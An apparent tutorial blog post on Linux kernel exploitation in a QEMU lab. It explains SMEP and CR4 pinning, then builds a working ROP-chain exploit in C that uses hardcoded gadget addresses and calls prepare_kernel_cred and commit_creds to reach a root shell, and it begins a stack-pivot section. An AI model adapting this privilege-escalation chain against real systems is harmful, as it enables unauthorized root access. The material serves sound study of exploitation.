---
title:Linux Kernel Exploitation Part 2: Adding Mitigitions
date: 2025-06-05
draft: false 
tags: [linux, kernel, SMEP, rop, exploitation] 
toc: true 
---

# Kernel 2: Adding Mitigitions

## **Adding SMEP**

`SMEP`, abbreviated for [Supervisor mode execution protection (SMEP)](https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf), is a feature that marks all the userland pages in the page table as non-executable when the process is exectuting in `kernel-mode`. In the kernel, this is enabled by setting the `20th bit` of Control Register `CR4`.

![image.png](image.png)

![image.png](image%201.png)

### Check it's in gdb

Run the qemu with `-s`  and on qemu boot, it can be enabled by adding `+smep` to `-cpu`, and disabled by adding `nosmep` to `-append`.

Attach GDB:

```bash
gdb vmlinux
```

Then in GDB:

```bash
(gdb) target remote :1234
```

Read `CR4` Register:

```bash
(gdb) monitor info registers
RAX=ffffffff8101b4c0 RBX=0000000000000000 RCX=ffff88800782c280 RDX=000000000000101e
RSI=0000000000000083 RDI=0000000000000000 RBP=ffffffff82003e18 RSP=ffffffff82003e18
R8 =ffff88800781efc0 R9 =000000000002ae00 R10=ffffffff82003e18 R11=0000000000000000
R12=0000000000000000 R13=0000000000000000 R14=0000000000000000 R15=ffffffff82013840
RIP=ffffffff8101b652 RFL=00000212 [----A--] CPL=0 II=0 A20=1 SMM=0 HLT=1
ES =0000 0000000000000000 00000000 00000000
CS =0010 0000000000000000 ffffffff 00af9b00 DPL=0 CS64 [-RA]
SS =0018 0000000000000000 ffffffff 00cf9300 DPL=0 DS   [-WA]
DS =0000 0000000000000000 00000000 00000000
FS =0000 0000000000000000 00000000 00000000
GS =0000 ffff888007800000 00000000 00000000
LDT=0000 0000000000000000 00000000 00008200 DPL=0 LDT
TR =0040 fffffe0000003000 00004087 00008900 DPL=0 TSS64-avl
GDT=     fffffe0000001000 0000007f
IDT=     fffffe0000000000 00000fff
CR0=80050033 CR2=00007fffa1611ac8 CR3=00000000064b6000 CR4=001006f0
DR0=0000000000000000 DR1=0000000000000000 DR2=0000000000000000 DR3=0000000000000000 
DR6=00000000ffff0ff0 DR7=0000000000000400
EFER=0000000000000d01
FCW=037f FSW=0000 [ST=0] FTW=00 MXCSR=00001f80
FPR0=0000000000000000 0000 FPR1=0000000000000000 0000
FPR2=0000000000000000 0000 FPR3=0000000000000000 0000
FPR4=0000000000000000 0000 FPR5=0000000000000000 0000
FPR6=0000000000000000 0000 FPR7=0000000000000000 0000
XMM00=0000000000000000 0000000000000000 XMM01=0000000000000000 0000000000000000
XMM02=0000000000000000 0000000000000000 XMM03=0000000000000000 0000000000000000
XMM04=0000000000000000 0000000000000000 XMM05=0000000000000000 0000000000000000
XMM06=0000000000000000 0000000000000000 XMM07=0000000000000000 0000000000000000
XMM08=0000000000000000 0000000000000000 XMM09=0000000000000000 0000000000000000
XMM10=0000000000000000 0000000000000000 XMM11=0000000000000000 0000000000000000
XMM12=0000000000000000 0000000000000000 XMM13=0000000000000000 0000000000000000
XMM14=0000000000000000 0000000000000000 XMM15=0000000000000000 0000000000000000

(gdb) p/t $cr4
$5 = 100000000011011110000
```

![image.png](image%202.png)

```bash
Bit index:  20        19 18 17 16 15 14 13 12 11 10  9  8  7  6  5  4  3  2  1  0
Binary:     1         0  0  0  0  0  0  0  0  1  1   0  1  1  1  1  0  0  0  0  0
```

As we can see, 20’s bit is 1 which means `SMEP` is turned on (Yes, we count bits from **right to left** because of how **binary numbers** are structured in computer systems)

Recall from the last part, where we achieved root privileges using a piece of code that we wrote ourselves, this strategy won’t be viable anymore with `SMEP` on. The reason is because our piece of code retains in `user-space`, and as I have explained above, `SMEP` has already marked the page which contains our code as non-executable when the process is executing in `kernel-mode`.

Recall further back to when most of us learned userland pwn, this is effectively the same as setting `NX` bit to make the stack non-executable. That is the time when we were introduced to `Return-oriented programming (ROP)` after learning `ret2shellcode`. The same concept applies with kernel exploitation, I will now introduce `kernel ROP` after having introduced `ret2usr`.

### **The attempt to overwrite CR4**

As I have mentioned above, in the kernel, the 20th bit of Control Register `CR4` is responsible for enabling or disabling `SMEP`. And, while executing in `kernel-mode`, we have the power to modify the content of this register with asm instructions such as `mov cr4, rdi`. Instruction such as that comes from a function called `native_write_cr4()`, which overwrites the content of `CR4` with its parameter, and it resides in the kernel itself. So my first attempt to bypass `SMEP` is to ROP into `native_write_cr4(value)`, where `value` is set to clear the 20th bit of `CR4`.

The same as `commit_creds()` and `prepare_kernel_cred()`, we can find the address of that function by reading `/proc/kallsyms`:

```bash
cat /proc/kallsyms | grep native_write_cr4
-> ffffffff814443e0 T native_write_cr4
```

The way we build a ROP chain in the kernel is exactly the same as in userland. So here, instead of immediately return into our userland code, we will return into `native_write_cr4(value)`, then return to our privileges escalation code. For the current value of `CR4`, we can get it by either causing a kernel panic and it will be dumped out (or attaching a debugger to the kernel)

```bash
[    3.794861] CR2: 0000000000401fd9 CR3: 000000000657c000 CR4: 00000000001006f0
```

We will clear the 20th bit, which is at the position of `0x100000`, our `value` will be `0x6f0`. Our payload will be as follows:

```c
unsigned long pop_rdi_ret = 0xffffffff81006370;
unsigned long native_write_cr4 = 0xffffffff814443e0;

void overflow(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = pop_rdi_ret; // return address
    payload[off++] = 0x6f0;
    payload[off++] = native_write_cr4; // native_write_cr4(0x6f0), effectively clear the 20th bit
    payload[off++] = (unsigned long)escalate_privs;

    puts("[*] Prepared payload");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
}
```

For gadgets such as `pop rdi ; ret`, we can easily find them by grepping the `gadgets.txt` file that was generated by running `ROPgadget` on the kernel image in the first post.

> *It seems that in the kernel image file `vmlinux`, there is no information about whether a region is executable or not, so `ROPgadget` will attempt to find all the gadgets that exist in the binary, even the non-executable ones. If you try to use a gadget and the kernel crashes because it is non-executable, you just have to try another one.*
> 

In theory, running this should give us a root shell. However, in reality, the kernel still crashes, and even more confusing, the reason for the crash is `SMEP`:

```c
unable to execute userspace code (SMEP?) (uid: 0)
```

![image.png](image%203.png)

Why is `SMEP` still active if we have already cleared the 20th bit? I decided to use `dmesg` to find out if there is anything weird happens to `CR4`, and I found this line:

```c
[    3.767510] pinned CR4 bits changed: 0x100000!?
```

It seems like the 20th bit of `CR4` is somehow pinned. I then proceeded to Google for the source code of `native_write_cr4()` and other resources to clarify the situation. Here is the source code:

[https://elixir.bootlin.com/linux/v6.15/source/arch/x86/kernel/cpu/common.c#L427](https://elixir.bootlin.com/linux/v6.15/source/arch/x86/kernel/cpu/common.c#L427)

![image.png](image%204.png)

Reading the mentioned resources, it is clear that in newer kernel versions, the 20th and 21st bits of `CR4` are pinned on boot, and will immediately be set again after being cleared, so ***they can never be overwritten this way anymore!***

So my first attempt was a fail. At least we now know that even though we have the power to overwrite `CR4` in `kernel-mode`, the kernel developers have already awared of it and prohibited us from using such thing to exploit the kernel. Let’s move on to develop a stronger exploitation that will actually work.

## **Building a complete escalation ROP chain**

In this second attempt, we will get rid of the idea of getting root privileges by running our own code completely, and try to achieve it by using ROP only. The plan is straightforward:

1. ROP into `prepare_kernel_cred(0)`.
2. ROP into `commit_creds()`, with the return value from step 1 as a parameter.
3. ROP into `swapgs ; ret`.
4. ROP into `iretq` with the stack setup as `RIP|CS|RFLAGS|SP|SS`.

The ROP chain itself is not complicated at all, but there are still some hiccups in building it. Firstly, as I mentioned above, there are a lot of gadgets that `ROPgadget` found but are unusable. Therefore, I had to do a lot of trials and errors and finally ended up using these gadgets to move the return value in step 1 (stored in `rax`) into `rdi` to pass to `commit_creds()`, they might seem a bit bizarre, but all of the ordinary gadgets that I tried are non-executable:

```c
unsigned long pop_rdx_ret = 0xffffffff81007616; // pop rdx ; ret
unsigned long cmp_rdx_jne_pop2_ret = 0xffffffff81964cc4; // cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret
unsigned long mov_rdi_rax_jne_pop2_ret = 0xffffffff8166fea3; // mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret
```

The goal with these 3 gadgets is to move `rax` into `rdi` without taking the `jne`. So I have to pop the value 8 into `rdx`, then return to a `cmp` instruction to make the comparison equals, which will make sure that we won’t jump to `jne` branch:

```c
...
payload[off++] = pop_rdx_ret;
payload[off++] = 0x8; // rdx <- 8
payload[off++] = cmp_rdx_jne_pop2_ret; // make sure JNE doesn't branch
payload[off++] = 0x0; // dummy rbx
payload[off++] = 0x0; // dummy rbp
payload[off++] = mov_rdi_rax_jne_pop2_ret; // rdi <- rax
payload[off++] = 0x0; // dummy rbx
payload[off++] = 0x0; // dummy rbp
payload[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0))
...

```

Secondly, it seems that `ROPgadget` can find `swapgs` just fine, but it can’t find `iretq`, so I have to use `objdump` to look for it:

```c
objdump -j .text -d ~/vmlinux | grep iretq | head -1
-> ffffffff8100c0d9:       48 cf                   iretq  
```

With the gadgets in hand, we can build the full ROP chain:

```c
unsigned long user_rip = (unsigned long)get_shell;

unsigned long pop_rdi_ret = 0xffffffff81006370;
unsigned long pop_rdx_ret = 0xffffffff81007616; // pop rdx ; ret
unsigned long cmp_rdx_jne_pop2_ret = 0xffffffff81964cc4; // cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret
unsigned long mov_rdi_rax_jne_pop2_ret = 0xffffffff8166fea3; // mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret
unsigned long commit_creds = 0xffffffff814c6410;
unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
unsigned long swapgs_pop1_ret = 0xffffffff8100a55f; // swapgs ; pop rbp ; ret
unsigned long iretq = 0xffffffff8100c0d9;

void overflow(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = pop_rdi_ret; // return address
    payload[off++] = 0x0; // rdi <- 0
    payload[off++] = prepare_kernel_cred; // prepare_kernel_cred(0)
    payload[off++] = pop_rdx_ret;
    payload[off++] = 0x8; // rdx <- 8
    payload[off++] = cmp_rdx_jne_pop2_ret; // make sure JNE doesn't branch
    payload[off++] = 0x0; // dummy rbx
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = mov_rdi_rax_jne_pop2_ret; // rdi <- rax
    payload[off++] = 0x0; // dummy rbx
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0))
    payload[off++] = swapgs_pop1_ret; // swapgs
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = iretq; // iretq frame
    payload[off++] = user_rip;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Prepared payload");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
}
```

And with that, we have successfully built an exploitation that bypasses `SMEP` and opens a root shell in the *first scenario*. Let’s move on to see what difficulty we might face in the second one.

### **Pivoting the stack**

It is clear that we cannot fit the whole ROP chain in the stack anymore with the assumption that we can only overflow up to the return address. To overcome that, we will again use a technique that is also quite popular in userland pwn: `stack pivot`. It is a technique which involves modifying `rsp` to point into a controlled writable address, effectively creating a fake stack. However, while pivoting the stack in userland often involves overwriting the `saved RBP` of a function, then return from it, pivoting in the kernel is much simpler. Because we have such a huge amount of gadgets in the kernel image, we can look for those which modify `rsp/esp` itself. We are most interested in gadgets that move a constant value into `esp`, just make sure that the gadget is executable, and the constant value is properly aligned. This is the gadget that I ended up using:

```c
unsigned long mov_esp_pop2_ret = 0xffffffff8196f56a; // mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret
```
